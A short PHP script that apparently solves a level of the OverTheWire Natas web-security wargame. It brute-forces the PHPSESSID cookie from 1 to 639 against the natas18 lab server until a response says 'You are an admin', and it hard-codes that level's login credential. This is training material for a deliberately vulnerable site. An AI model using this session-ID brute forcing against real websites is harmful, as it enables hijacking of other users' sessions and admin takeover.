<?php

$authorization = "natas18:8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq";
$url = "http://natas18.natas.labs.overthewire.org/index.php?debug";

$handle = curl_init();

$data = array(
    'username' => 'username',
    'password' => 'password'
);

curl_setopt_array(
    $handle,
    array(
        CURLOPT_URL => $url,
        CURLOPT_HTTPAUTH => CURLAUTH_BASIC,
        CURLOPT_USERPWD => $authorization,
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_POSTFIELDS => $data,
    )
);


for ($i = 1; $i < 640; $i++) {
    $cookie = "PHPSESSID=$i";

    curl_setopt_array(
        $handle,
        array(
            CURLOPT_COOKIE => $cookie,
        )
    );

    $response = curl_exec($handle);


    if (str_contains($response, "You are an admin")) {
        echo $response;
    }
}

curl_close($handle);
